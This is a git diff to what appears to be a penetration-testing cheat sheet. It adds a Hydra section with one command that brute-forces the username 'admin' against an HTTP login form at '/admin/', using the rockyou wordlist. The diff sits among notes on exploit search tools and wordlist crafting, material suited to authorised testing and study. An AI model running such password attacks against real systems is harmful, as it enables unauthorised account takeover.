@@ -428,6 +428,11 @@ ping name
     - [AttackerKB TOOL](https://github.com/horshark/akb-explorer)
     - TOOl SearchSploit
 
+## Hydra
+**Username & Password Enum from httpBruteForce**
+```sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/admin/:user=^USER^&pass=^PASS^&Login:Username or password invalid"
+```
 ## Brute Forcing
 **Crafting Wordlist**
 - [RawSec](https://inventory.raw.pm/overview.html)
